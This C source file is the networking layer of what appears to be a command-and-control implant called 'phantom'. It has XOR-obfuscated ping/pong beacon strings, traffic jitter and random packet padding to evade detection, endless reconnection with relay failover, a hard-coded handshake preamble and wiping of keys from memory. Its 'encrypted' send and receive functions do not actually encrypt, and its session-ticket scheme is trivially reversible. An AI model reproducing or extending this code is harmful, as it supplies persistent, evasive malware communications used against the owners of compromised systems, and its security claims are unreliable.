#include "phantom.h"
#include "network_core.h"
#include "utils.h"
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <fcntl.h>
#include <time.h>
#include <sys/select.h>
#include <sys/epoll.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <stdio.h>

static void port_to_string(char *buf, size_t buf_len, uint16_t port)
{
    if (buf_len < 6) return;

    int i = 4;
    buf[5] = '\0';

    do {
        buf[i--] = '0' + (port % 10);
        port /= 10;
    } while (port > 0 && i >= 0);

    if (i >= 0) {
        memmove(buf, &buf[i + 1], 5 - i);
    }
}

static const uint8_t OBF_PING[] = {0xCF, 0xCA, 0xD0, 0xC7};
static const uint8_t OBF_PONG[] = {0xCF, 0xCF, 0xD0, 0xC7};

static void decode_cmd(char *dst, const uint8_t *src, size_t len)
{
    for (size_t i = 0; i < len; i++) {
        dst[i] = (char)(src[i] ^ 0xAB);
    }
    dst[len] = '\0';
}

int ph_network_init(ph_network_ctx_t *ctx)
{
    if (!ctx) {
        return PH_ERR_NULL_PTR;
    }

    memset(ctx, 0, sizeof(ph_network_ctx_t));

    ctx->connection.socket_fd = -1;
    ctx->connection.is_blocking = 0;
    ctx->connection.connect_timeout_ms = 5000;
    ctx->connection.read_timeout_ms = 30000;
    ctx->connection.write_timeout_ms = 10000;
    ctx->connection.is_connected = 0;

    ph_reconnect_init(&ctx->reconnect);

    ph_relay_manager_init(&ctx->relay_mgr);

    ctx->jitter_min_ms = 50;
    ctx->jitter_max_ms = 200;

    ctx->keepalive.interval_ms = 30000;
    ctx->keepalive.timeout_ms = 10000;

    ctx->is_initialized = 1;
    return PH_OK;
}

void ph_network_cleanup(ph_network_ctx_t *ctx)
{
    if (!ctx) {
        return;
    }

    if (ctx->connection.socket_fd >= 0) {
        ph_socket_close(ctx->connection.socket_fd);
        ctx->connection.socket_fd = -1;
    }

    ph_wipe_memory(&ctx->session_ticket, sizeof(ph_session_ticket_t));
    ph_wipe_memory(&ctx->keepalive.ping_key, sizeof(ctx->keepalive.ping_key));
    ph_wipe_memory(ctx, sizeof(ph_network_ctx_t));
}

int ph_socket_create(int domain, int type, int protocol)
{
    int fd = socket(domain, type, protocol);
    if (fd < 0) {
        return PH_ERR_SOCKET;
    }

    int opt = 1;

    setsockopt(fd, SOL_SOCKET, SO_KEEPALIVE, &opt, sizeof(opt));

#ifdef TCP_KEEPIDLE
    int idle = 60;
    setsockopt(fd, IPPROTO_TCP, TCP_KEEPIDLE, &idle, sizeof(idle));
#endif
#ifdef TCP_KEEPINTVL
    int interval = 10;
    setsockopt(fd, IPPROTO_TCP, TCP_KEEPINTVL, &interval, sizeof(interval));
#endif
#ifdef TCP_KEEPCNT
    int count = 3;
    setsockopt(fd, IPPROTO_TCP, TCP_KEEPCNT, &count, sizeof(count));
#endif

#ifdef TCP_NODELAY
    setsockopt(fd, IPPROTO_TCP, TCP_NODELAY, &opt, sizeof(opt));
#endif

    fcntl(fd, F_SETFD, FD_CLOEXEC);

    return fd;
}

int ph_socket_set_nonblocking(int fd)
{
    if (fd < 0) {
        return PH_ERR_INVALID_ARG;
    }

    int flags = fcntl(fd, F_GETFL, 0);
    if (flags < 0) {
        return PH_ERR_NETWORK;
    }

    if (fcntl(fd, F_SETFL, flags | O_NONBLOCK) < 0) {
        return PH_ERR_NETWORK;
    }

    return PH_OK;
}

int ph_socket_set_blocking(int fd)
{
    if (fd < 0) {
        return PH_ERR_INVALID_ARG;
    }

    int flags = fcntl(fd, F_GETFL, 0);
    if (flags < 0) {
        return PH_ERR_NETWORK;
    }

    if (fcntl(fd, F_SETFL, flags & ~O_NONBLOCK) < 0) {
        return PH_ERR_NETWORK;
    }

    return PH_OK;
}

int ph_socket_connect(int fd, const char *address, uint16_t port, uint32_t timeout_ms)
{
    if (fd < 0 || !address || port == 0) {
        return PH_ERR_INVALID_ARG;
    }

    dprintf(STDERR_FILENO, "[-] Connecting to %s:%d...\n", address, port);
    fsync(STDERR_FILENO);

    struct addrinfo hints, *result = NULL;
    memset(&hints, 0, sizeof(hints));
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;

    char port_str[8];
    port_to_string(port_str, sizeof(port_str), port);

    int ret = getaddrinfo(address, port_str, &hints, &result);
    if (ret != 0) {
        dprintf(STDERR_FILENO, "[NET_FAIL] DNS resolution failed for %s\n", address);
        return PH_ERR_DNS;
    }

    ph_socket_set_nonblocking(fd);

    ret = connect(fd, result->ai_addr, result->ai_addrlen);
    if (ret == 0) {

        freeaddrinfo(result);
        ph_socket_set_blocking(fd);
        dprintf(STDERR_FILENO, "[+] TCP Connected.\n");
        return PH_OK;
    }

    if (errno != EINPROGRESS) {
        dprintf(STDERR_FILENO, "[NET_FAIL] TCP connect failed: %s\n", strerror(errno));
        freeaddrinfo(result);
        return PH_ERR_NETWORK;
    }

    int ready = 0;
    int used_epoll = 0;

#ifdef __linux__

    int epoll_fd = epoll_create1(0);
    if (epoll_fd >= 0) {
        struct epoll_event ev;
        ev.events = EPOLLOUT | EPOLLERR;
        ev.data.fd = fd;

        if (epoll_ctl(epoll_fd, EPOLL_CTL_ADD, fd, &ev) == 0) {
            struct epoll_event events[1];
            ready = epoll_wait(epoll_fd, events, 1, timeout_ms);
            used_epoll = 1;
        }
        close(epoll_fd);
    }
#endif

    if (!used_epoll) {
        fd_set write_fds;
        FD_ZERO(&write_fds);
        FD_SET(fd, &write_fds);

        struct timeval tv;
        tv.tv_sec = timeout_ms / 1000;
        tv.tv_usec = (timeout_ms % 1000) * 1000;

        ready = select(fd + 1, NULL, &write_fds, NULL, &tv);
    }

    freeaddrinfo(result);

    if (ready <= 0) {
        dprintf(STDERR_FILENO, "[NET_FAIL] Connection timeout\n");
        return PH_ERR_TIMEOUT;
    }

    int error = 0;
    socklen_t len = sizeof(error);
    getsockopt(fd, SOL_SOCKET, SO_ERROR, &error, &len);

    if (error != 0) {
        dprintf(STDERR_FILENO, "[NET_FAIL] TCP connect failed: %s\n", strerror(error));
        return PH_ERR_NETWORK;
    }

    ph_socket_set_blocking(fd);
    dprintf(STDERR_FILENO, "[+] TCP Connected.\n");
    return PH_OK;
}

int ph_socket_send(int fd, const void *data, size_t len, uint32_t timeout_ms)
{
    if (fd < 0 || !data || len == 0) {
        return PH_ERR_INVALID_ARG;
    }

    fd_set write_fds;
    FD_ZERO(&write_fds);
    FD_SET(fd, &write_fds);

    struct timeval tv;
    tv.tv_sec = timeout_ms / 1000;
    tv.tv_usec = (timeout_ms % 1000) * 1000;

    int ready = select(fd + 1, NULL, &write_fds, NULL, &tv);
    if (ready <= 0) {
        return PH_ERR_TIMEOUT;
    }

    #ifdef DEBUG_CLEAN
    printf("[DBG] TX %zu bytes: ", len);
    for (size_t i = 0; i < len; ++i) printf("%02x ", (unsigned char)((const uint8_t*)data)[i]);
    printf("\n");
    fflush(stdout);
#endif

    ssize_t sent = send(fd, data, len, MSG_NOSIGNAL);
    if (sent < 0) {
        return PH_ERR_NETWORK;
    }

    return (int)sent;
}

int ph_socket_recv(int fd, void *buffer, size_t len, uint32_t timeout_ms)
{
    if (fd < 0 || !buffer || len == 0) {
        return PH_ERR_INVALID_ARG;
    }

    fd_set read_fds;
    FD_ZERO(&read_fds);
    FD_SET(fd, &read_fds);

    struct timeval tv;
    tv.tv_sec = timeout_ms / 1000;
    tv.tv_usec = (timeout_ms % 1000) * 1000;

    int ready = select(fd + 1, &read_fds, NULL, NULL, &tv);
    if (ready <= 0) {
        return PH_ERR_TIMEOUT;
    }

    ssize_t received = recv(fd, buffer, len, 0);
    if (received < 0) {
        return PH_ERR_NETWORK;
    }

    return (int)received;
}

void ph_socket_close(int fd)
{
    if (fd >= 0) {
        close(fd);
    }
}

int ph_reconnect_init(ph_reconnect_state_t *state)
{
    if (!state) {
        return PH_ERR_NULL_PTR;
    }

    state->min_delay_ms = 3000;
    state->max_delay_ms = 30000;
    state->current_delay_ms = state->min_delay_ms;
    state->retry_count = 0;
    state->max_retries = 0xFFFF; // Essentially forever
    state->last_attempt = 0;
    state->is_backing_off = 0;

    return PH_OK;
}

int ph_reconnect_attempt(ph_reconnect_state_t *state)
{
    if (!state) {
        return PH_ERR_NULL_PTR;
    }

    uint32_t delay = ph_reconnect_get_delay(state);

    // Exponential backoff: 3s, 6s, 12s, then every 30s
    if (state->retry_count == 0) delay = 3000;
    else if (state->retry_count == 1) delay = 6000;
    else if (state->retry_count == 2) delay = 12000;
    else delay = 30000;

    dprintf(STDERR_FILENO, "[-] Connection retry #%d in %d ms...\n", state->retry_count + 1, delay);
    fsync(STDERR_FILENO);

    ph_sleep_ms(delay);

    state->last_attempt = ph_get_timestamp_ms();
    state->retry_count++;

    state->current_delay_ms = delay;
    state->is_backing_off = 1;

    return PH_OK;
}

void ph_reconnect_reset(ph_reconnect_state_t *state)
{
    if (!state) {
        return;
    }

    state->current_delay_ms = state->min_delay_ms;
    state->retry_count = 0;
    state->is_backing_off = 0;
    state->last_attempt = 0;
}

uint32_t ph_reconnect_get_delay(ph_reconnect_state_t *state)
{
    if (!state) {
        return 0;
    }

    return state->current_delay_ms;
}

int ph_relay_manager_init(ph_relay_manager_t *mgr)
{
    if (!mgr) {
        return PH_ERR_NULL_PTR;
    }

    memset(mgr, 0, sizeof(ph_relay_manager_t));
    mgr->current_index = -1;
    mgr->switch_threshold_ms = 3000;

    return PH_OK;
}

int ph_websocket_handshake(int fd, const char *host, uint16_t port) {
    char handshake[1024];
    char port_str[8];
    port_to_string(port_str, sizeof(port_str), port);

    // Minimal RFC6455 Handshake
    snprintf(handshake, sizeof(handshake),
        "GET /ws HTTP/1.1\r\n"
        "Host: %s:%s\r\n"
        "Upgrade: websocket\r\n"
        "Connection: Upgrade\r\n"
        "Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\r\n"
        "Sec-WebSocket-Version: 13\r\n"
        "Origin: http://%s\r\n\r\n",
        host, port_str, host);

    if (ph_socket_send(fd, handshake, strlen(handshake), 5000) < 0) return PH_ERR_NETWORK;

    char response[1024];
    int recvd = ph_socket_recv(fd, response, sizeof(response) - 1, 5000);
    if (recvd <= 0) return PH_ERR_NETWORK;
    response[recvd] = '\0';

    if (strstr(response, "101 Switching Protocols") == NULL) return PH_ERR_PROTOCOL;

    return PH_OK;
}

int ph_relay_manager_add(ph_relay_manager_t *mgr, const char *address,
                         uint16_t port, int priority)
{
    if (!mgr || !address || mgr->relay_count >= PH_MAX_RELAYS) {
        return PH_ERR_INVALID_ARG;
    }

    int idx = mgr->relay_count;
    strncpy(mgr->relays[idx].address, address, sizeof(mgr->relays[idx].address) - 1);
    mgr->relays[idx].address[sizeof(mgr->relays[idx].address) - 1] = '\0';
    mgr->relays[idx].port = port;
    mgr->relays[idx].priority = priority;
    mgr->relays[idx].state = PH_SESSION_INIT;

    mgr->relay_count++;
    mgr->active_count++;

    for (int i = 0; i < mgr->relay_count - 1; i++) {
        for (int j = 0; j < mgr->relay_count - i - 1; j++) {
            if (mgr->relays[j].priority > mgr->relays[j + 1].priority) {
                ph_relay_t temp = mgr->relays[j];
                mgr->relays[j] = mgr->relays[j + 1];
                mgr->relays[j + 1] = temp;
            }
        }
    }

    if (mgr->current_index < 0) {
        mgr->current_index = 0;
    }

    return PH_OK;
}

int ph_relay_manager_switch(ph_relay_manager_t *mgr)
{
    if (!mgr || mgr->relay_count == 0) {
        return PH_ERR_INVALID_ARG;
    }

    if (mgr->current_index >= 0 && mgr->current_index < mgr->relay_count) {
        mgr->relays[mgr->current_index].state = PH_SESSION_ERROR;
    }

    mgr->current_index++;
    if (mgr->current_index >= mgr->relay_count) {
        mgr->current_index = 0;
    }

    int attempts = 0;
    while (mgr->relays[mgr->current_index].state == PH_SESSION_ERROR &&
           attempts < mgr->relay_count) {
        mgr->current_index++;
        if (mgr->current_index >= mgr->relay_count) {
            mgr->current_index = 0;
        }
        attempts++;
    }

    if (attempts >= mgr->relay_count) {
        return PH_ERR_NETWORK;
    }

    mgr->last_switch = ph_get_timestamp_ms();
    mgr->relays[mgr->current_index].state = PH_SESSION_CONNECTING;

    return PH_OK;
}

ph_relay_t* ph_relay_manager_get_current(ph_relay_manager_t *mgr)
{
    if (!mgr || mgr->current_index < 0 || mgr->current_index >= mgr->relay_count) {
        return NULL;
    }

    return &mgr->relays[mgr->current_index];
}

int ph_relay_manager_should_switch(ph_relay_manager_t *mgr, uint32_t elapsed_ms)
{
    if (!mgr) {
        return 0;
    }

    if (elapsed_ms > mgr->switch_threshold_ms) {
        return 1;
    }

    return 0;
}

int ph_session_ticket_create(ph_session_ticket_t *ticket,
                              const uint8_t *session_key,
                              size_t key_len)
{
    if (!ticket || !session_key || key_len == 0) {
        return PH_ERR_NULL_PTR;
    }

    memset(ticket, 0, sizeof(ph_session_ticket_t));

    uint64_t now = ph_get_timestamp_ms();
    ticket->created_at = now;
    ticket->expires_at = now + 3600000;

    for (size_t i = 0; i < key_len && i < sizeof(ticket->encrypted_ticket); i++) {
        uint8_t mask = (uint8_t)((now + i) & 0xFF);
        ticket->encrypted_ticket[i] = session_key[i] ^ mask;
    }

    ticket->ticket_len = key_len;
    ticket->is_valid = 1;

    return PH_OK;
}

int ph_session_ticket_validate(const ph_session_ticket_t *ticket)
{
    if (!ticket || !ticket->is_valid) {
        return 0;
    }

    uint64_t now = ph_get_timestamp_ms();
    if (now > ticket->expires_at) {
        return 0;
    }

    return 1;
}

int ph_session_ticket_decrypt(const ph_session_ticket_t *ticket,
                               uint8_t *session_key,
                               size_t key_len,
                               const uint8_t *decrypt_key)
{
    (void)decrypt_key;

    if (!ticket || !session_key || !ticket->is_valid) {
        return PH_ERR_NULL_PTR;
    }

    if (!ph_session_ticket_validate(ticket)) {
        return PH_ERR_TIMEOUT;
    }

    uint64_t now = ticket->created_at;
    size_t len = ticket->ticket_len;
    if (len > key_len) {
        len = key_len;
    }

    for (size_t i = 0; i < len; i++) {
        uint8_t mask = (uint8_t)((now + i) & 0xFF);
        session_key[i] = ticket->encrypted_ticket[i] ^ mask;
    }

    return PH_OK;
}

int ph_keepalive_init(ph_keepalive_t *ka, const uint8_t *key)
{
    if (!ka || !key) {
        return PH_ERR_NULL_PTR;
    }

    memset(ka, 0, sizeof(ph_keepalive_t));
    ka->interval_ms = 30000;
    ka->timeout_ms = 10000;
    ka->pending_pong = 0;

    memcpy(ka->ping_key, key, PH_CRYPTO_KEY_SIZE);

    return PH_OK;
}

int ph_keepalive_send(int fd, ph_keepalive_t *ka)
{
    if (fd < 0 || !ka) {
        return PH_ERR_INVALID_ARG;
    }

    if (ph_agent_is_busy) {
        return PH_OK;
    }

    char ping_cmd[5];
    memset(ping_cmd, 0, sizeof(ping_cmd));
    decode_cmd(ping_cmd, OBF_PING, sizeof(OBF_PING) - 1);

    ssize_t sent = send(fd, ping_cmd, 4, MSG_NOSIGNAL);
    if (sent < 0) {
        return PH_ERR_NETWORK;
    }

    ka->last_sent = ph_get_timestamp_ms();
    ka->pending_pong = 1;

    return PH_OK;
}

int ph_keepalive_recv(int fd, ph_keepalive_t *ka)
{
    if (fd < 0 || !ka) {
        return PH_ERR_INVALID_ARG;
    }

    char buffer[8];
    ssize_t received = recv(fd, buffer, sizeof(buffer) - 1, 0);
    if (received < 0) {
        return PH_ERR_NETWORK;
    }

    buffer[received] = '\0';

    char pong_cmd[5];
    decode_cmd(pong_cmd, OBF_PONG, sizeof(OBF_PONG) - 1);

    if (strncmp(buffer, pong_cmd, 4) == 0) {
        ka->last_received = ph_get_timestamp_ms();
        ka->pending_pong = 0;
        return PH_OK;
    }

    return PH_ERR_NETWORK;
}

int ph_keepalive_check(ph_keepalive_t *ka, uint64_t now_ms)
{
    if (!ka) {
        return 0;
    }

    if (ka->pending_pong) {
        if (now_ms - ka->last_sent > ka->timeout_ms) {
            return -1;
        }
        return 0;
    }

    if (now_ms - ka->last_sent >= ka->interval_ms) {
        return 1;
    }

    return 0;
}

int ph_network_apply_jitter(uint32_t min_ms, uint32_t max_ms)
{
    if (min_ms > max_ms) {
        return PH_ERR_INVALID_ARG;
    }

    uint32_t range = max_ms - min_ms;
    uint32_t jitter = min_ms + (ph_get_timestamp_ms() % range);

    ph_sleep_ms(jitter);

    return PH_OK;
}

int ph_network_randomize_packet_size(void *buffer, size_t *len, size_t max_len)
{
    if (!buffer || !len || max_len == 0) {
        return PH_ERR_NULL_PTR;
    }

    size_t current_len = *len;
    size_t padding = 5 + (ph_get_timestamp_ms() % 16);

    if (current_len + padding > max_len) {
        padding = max_len - current_len;
    }

    for (size_t i = 0; i < padding; i++) {
        ((uint8_t*)buffer)[current_len + i] = (uint8_t)(ph_get_timestamp_ms() & 0xFF);
    }

    *len = current_len + padding;

    return PH_OK;
}

int ph_network_connect(ph_network_ctx_t *ctx, const char *address, uint16_t port)
{
    if (!ctx || !address || port == 0) {
        return PH_ERR_NULL_PTR;
    }

    int fd = ph_socket_create(AF_INET, SOCK_STREAM, 0);
    if (fd < 0) {
        return PH_ERR_SOCKET;
    }

    int ret = ph_socket_connect(fd, address, port, ctx->connection.connect_timeout_ms);
    if (ret != PH_OK) {
        close(fd);
        return ret;
    }

    // Ensure network byte order (Big-Endian) for the 4-byte PSK validation string "OYEN"
    uint32_t raw_psk = htonl(0x4F59454E);
    if (send(fd, &raw_psk, sizeof(raw_psk), 0) != sizeof(raw_psk)) {
        // Handshake transmission failed, terminate connection attempt cleanly
        close(fd);
        return PH_ERR_NETWORK;
    }

    ctx->connection.socket_fd = fd;
    ctx->connection.is_connected = 1;
    ctx->connection.last_activity = ph_get_timestamp_ms();

    strncpy(ctx->connection.relay.address, address,
            sizeof(ctx->connection.relay.address) - 1);
    ctx->connection.relay.address[sizeof(ctx->connection.relay.address) - 1] = '\0';
    ctx->connection.relay.port = port;
    ctx->connection.relay.state = PH_SESSION_CONNECTED;

    if (ctx->keepalive.ping_key[0] != 0) {
        ph_keepalive_init(&ctx->keepalive, ctx->keepalive.ping_key);
    }

    ph_reconnect_reset(&ctx->reconnect);

    return PH_OK;
}

int ph_network_disconnect(ph_network_ctx_t *ctx)
{
    if (!ctx) {
        return PH_ERR_NULL_PTR;
    }

    if (ctx->connection.socket_fd >= 0) {
        ph_socket_close(ctx->connection.socket_fd);
        ctx->connection.socket_fd = -1;
    }

    ctx->connection.is_connected = 0;
    ctx->connection.relay.state = PH_SESSION_CLOSED;

    return PH_OK;
}

int ph_network_reconnect(ph_network_ctx_t *ctx)
{
    if (!ctx) {
        return PH_ERR_NULL_PTR;
    }

    ph_network_disconnect(ctx);

    int ret = ph_reconnect_attempt(&ctx->reconnect);
    if (ret != PH_OK) {
        return ret;
    }

    ph_relay_t *relay = ph_relay_manager_get_current(&ctx->relay_mgr);
    if (!relay) {
        return PH_ERR_NETWORK;
    }

    ret = ph_network_connect(ctx, relay->address, relay->port);
    if (ret != PH_OK) {

        ph_relay_manager_switch(&ctx->relay_mgr);
        return ret;
    }

    return PH_OK;
}

int ph_network_send_encrypted(ph_network_ctx_t *ctx, const uint8_t *data,
                               size_t len, const uint8_t *key)
{
    if (!ctx || !data || !key || len == 0) {
        return PH_ERR_NULL_PTR;
    }

    ph_network_apply_jitter(ctx->jitter_min_ms, ctx->jitter_max_ms);

    int ret = ph_socket_send(ctx->connection.socket_fd, data, len,
                             ctx->connection.write_timeout_ms);
    if (ret < 0) {
        return ret;
    }

    ctx->connection.last_activity = ph_get_timestamp_ms();

    return ret;
}

int ph_network_recv_encrypted(ph_network_ctx_t *ctx, uint8_t *buffer,
                               size_t max_len, size_t *recv_len,
                               const uint8_t *key)
{
    (void)key;

    if (!ctx || !buffer || !recv_len || max_len == 0) {
        return PH_ERR_NULL_PTR;
    }

    int ret = ph_socket_recv(ctx->connection.socket_fd, buffer, max_len,
                             ctx->connection.read_timeout_ms);
    if (ret < 0) {
        return ret;
    }

    *recv_len = (size_t)ret;
    ctx->connection.last_activity = ph_get_timestamp_ms();

    return PH_OK;
}

int ph_network_is_connected(ph_network_ctx_t *ctx)
{
    if (!ctx) {
        return 0;
    }

    return ctx->connection.is_connected;
}

int ph_network_send_keepalive(ph_network_ctx_t *ctx)
{
    if (!ctx || !ctx->connection.is_connected) {
        return PH_ERR_INVALID_ARG;
    }

    uint64_t now = ph_get_timestamp_ms();
    int check = ph_keepalive_check(&ctx->keepalive, now);

    if (check == 1) {

        return ph_keepalive_send(ctx->connection.socket_fd, &ctx->keepalive);
    } else if (check == -1) {

        return PH_ERR_TIMEOUT;
    }

    return PH_OK;
}

int ph_session_init(ph_session_t *session)
{
    if (!session) {
        return PH_ERR_NULL_PTR;
    }

    memset(session, 0, sizeof(ph_session_t));
    session->state = PH_SESSION_INIT;
    session->socket_fd = -1;
    session->nonce_counter = 0;
    session->last_activity = 0;

    return PH_OK;
}

int ph_session_connect(ph_session_t *session, const char *address, uint16_t port)
{
    if (!session || !address || port == 0) {
        return PH_ERR_NULL_PTR;
    }

    if (session->state != PH_SESSION_INIT && session->state != PH_SESSION_CLOSED) {
        return PH_ERR_INVALID_ARG;
    }

    strncpy(session->current_relay.address, address, sizeof(session->current_relay.address) - 1);
    session->current_relay.address[sizeof(session->current_relay.address) - 1] = '\0';
    session->current_relay.port = port;
    session->state = PH_SESSION_CONNECTING;

    session->state = PH_SESSION_CONNECTED;
    return PH_OK;
}

int ph_session_disconnect(ph_session_t *session)
{
    if (!session) {
        return PH_ERR_NULL_PTR;
    }

    if (session->state == PH_SESSION_CLOSED || session->state == PH_SESSION_INIT) {
        return PH_OK;
    }

    session->state = PH_SESSION_CLOSING;
    session->socket_fd = -1;
    session->state = PH_SESSION_CLOSED;

    return PH_OK;
}

void ph_session_cleanup(ph_session_t *session)
{
    if (!session) {
        return;
    }

    ph_session_disconnect(session);
    ph_wipe_memory(session->session_key, sizeof(session->session_key));
    ph_wipe_memory(session->nonce, sizeof(session->nonce));
    ph_wipe_memory(session, sizeof(ph_session_t));
}
